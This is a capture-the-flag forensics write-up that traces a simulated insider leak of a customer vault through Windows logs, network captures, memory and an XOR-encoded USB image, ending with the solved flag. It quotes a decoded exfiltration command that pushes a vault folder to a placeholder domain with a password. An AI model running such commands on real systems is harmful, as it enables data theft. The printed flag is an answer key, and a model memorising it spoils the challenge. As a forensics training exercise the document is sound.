# CRUSH WORKSTATION UPDATE: writeup

**Category:** Forensics · **Difficulty:** Hard · **Points:** 100 · **Author:** BHAIYA_JI

**Flag:** `GPI{8693ed3b5531e91f0b24e27b814f6baa}`

Incident string:

```
DARK_LEDGER_CHRISTINE_FERGUSON_EXFILKING_MEGASYNC.EXE_CDN-LEDGER.INVALID_2026-09-28_07-52-32_302MB_CASE-3714
```

## Challenge

Reconstruct `DARK_LEDGER_<INSIDER_NAME>_<THREAT_ALIAS>_<TOOL>_<DOMAIN>_<DATE>_<TIME>_<SIZE>_<CASE_ID>` and submit `GPI{md5_hex_digest}`.

> On the challenge page the separators are hidden by markdown: `_<THREAT_ALIAS>_`, `_<DOMAIN>_` and `_<TIME>_` render as italics and the underscores disappear, so it looks like `<INSIDER_NAME><THREAT_ALIAS><TOOL>…<SIZE>_<CASE_ID>`. Every field is actually separated by `_`.

The case brief warns about **fake flags, altered timestamps and decoy files**, so every value below is confirmed by at least two independent sources.

## Evidence package

```
case_brief.md  employee_list.csv
workstation_artifacts/  (MFT, USN, Prefetch, RecentDocs .lnk, Amcache, Security.json)
mobile_backup/          (messages.db, notes.db, call_logs.db)
cloud/                  (cloud_audit_logs.json, storage_access.log)
network/                (network_capture.pcapng, dns_cache.txt, zeek_logs/conn.log)
leak_site_mirror/       (index.html, robots.txt, sample_customers.csv, proof_image.jpg)
usb_image/suspicious_usb.img
memory_dump/memory.raw
```

## 1. Insider: `CHRISTINE_FERGUSON`

- `Security.json`: interactive logon (4624, type 2) by **cferguson** at 07:12:32, then USB attach, the PowerShell launch and the audit log clear (1102), all under cferguson
- `RecentDocs/customer_vault.zip.lnk`: "accessed at 2026-09-28T07:52:32 by cferguson"
- `MFT_simulated.csv`: `MEGASYNC.exe` in `C:\Users\cferguson\AppData\Local\Temp`
- Cloud logs: cferguson downloads `customer-vault/vault.zip`
- `employee_list.csv`: `cferguson` = **Christine Ferguson** (listed twice, in IT Support and in Sales, a decoy for the department, but the name is the same)

## 2. Threat actor alias: `EXFILKING`

- `leak_site_mirror/index.html`: `<h1>OPERATED BY EXFILKING</h1>`
- `messages.db`: "The board will publish notice under EXFILKING."
- Memory: `[CHAT] <EXFILKING>: vault acquired`
- Decrypted USB `exfil_plan.enc`: "Threat coordinator: EXFILKING."
- Decoys in memory: `Contacting alias ScriptKiddie ... Failed`, `Contacting alias Neo ... Failed`

## 3. Tool: `MEGASYNC.EXE`

- Prefetch `MEGASYNC.EXE-1A2B3C4D.pf`, Amcache (`Data Synchronization Service`), MFT, USN
- PowerShell `-EncodedCommand` (UTF-16LE Base64) decodes to:
  ```
  MEGASYNC.exe sync C:\Vault\ CDN-LEDGER.INVALID:/leak --password j9YEzGdi)FXf
  ```
- HTTP header `X-Client-ID: TUVHQVNZTkMvMS40LjI=` → `MEGASYNC/1.4.2`. Storage-log user agent `MEGASYNC/1.0`.
- Decoys in memory: Cyberduck / OneDrive / FileZilla / WinSCP "background service" lines

## 4. Exfil domain: `CDN-LEDGER.INVALID`

- PowerShell command, `notes.db`, `messages.db`, leak-site HTML comment ("Ingest verified via endpoint CDN-LEDGER.INVALID")
- `dns_cache.txt`: `CDN-LEDGER.INVALID → 192.168.1.100`. Zeek and the pcap show the large transfer going to 192.168.1.100.
- pcap: `POST /api/v1/vault-sync`, `Host: CDN-LEDGER.INVALID` (and `robots.txt` lists `/api/v1/vault-sync/`)
- The other DNS names (`update.microsoft.invalid`, `telemetry.aws.local`, …) are decoy traffic

## 5. Date and time: `2026-09-28` / `07-52-32`

Every log agrees on **2026-09-28 07:52:32**:

| Source | Event |
|---|---|
| Security.json 4688 | powershell.exe launch with the MEGASYNC command |
| Prefetch | MEGASYNC.EXE execution time |
| Amcache | MEGASYNC.exe FirstRun |
| MFT / USN | customer_vault.zip modified / `DataRead_SecurityAccess` |
| RecentDocs .lnk | customer_vault.zip accessed |
| cloud_audit_logs.json, storage_access.log | vault.zip download |
| zeek conn.log | 7,000,249-byte connection to 192.168.1.100 |

Anti-forensics: event **4616 at 08:04:32** "System time changed by user (Decoy Delta: +12m)". It happened **after** the incident, so it doesn't affect the logged time, and the brief asks for the time "according to the logs".

## 6. Size: `302MB`

- Cloud audit and storage log: `vault.zip` = **316,669,952 bytes**
- pcap `Content-Length: 316669952`
- 316,669,952 / 1,048,576 = **302.0 MB** exactly (in decimal it would be 316.67 MB, not a whole number)
- Decoy: Zeek `orig_bytes` 7,000,249 (≈6.7 MB) is only the truncated capture (5000 × 1400 + 249 bytes), not the vault

## 7. Case ID: `CASE-3714`

- pcap HTTP header `X-Session-Auth: Q0FTRS0zNzE0` → Base64 → `CASE-3714`
- USB image: the whole image is XORed with `0x7A` (hinted in memory: `[SYS_LOG] USB format routine applied XOR mask 0x7A`). Decoded, it's a tar archive containing `.vault_sync/exfil_plan.enc`, which is XORed with `0x33` (memory: `[SYS_LOG] exfil_plan encoded with XOR 0x33`) and then Base64:
  ```
  Exfiltration target: Push customer vault using MEGASYNC to CDN-LEDGER.INVALID.
  Incident tracking assigned as CASE-3714. Threat coordinator: EXFILKING.
  ```

```python
usb = bytes(b ^ 0x7A for b in open('suspicious_usb.img', 'rb').read())   # → POSIX tar
enc = open('.vault_sync/exfil_plan.enc', 'rb').read()
print(base64.b64decode(bytes(b ^ 0x33 for b in enc)))
```

## Flag

```bash
printf '%s' 'DARK_LEDGER_CHRISTINE_FERGUSON_EXFILKING_MEGASYNC.EXE_CDN-LEDGER.INVALID_2026-09-28_07-52-32_302MB_CASE-3714' | md5sum
# 8693ed3b5531e91f0b24e27b814f6baa
```

```
GPI{8693ed3b5531e91f0b24e27b814f6baa}
```
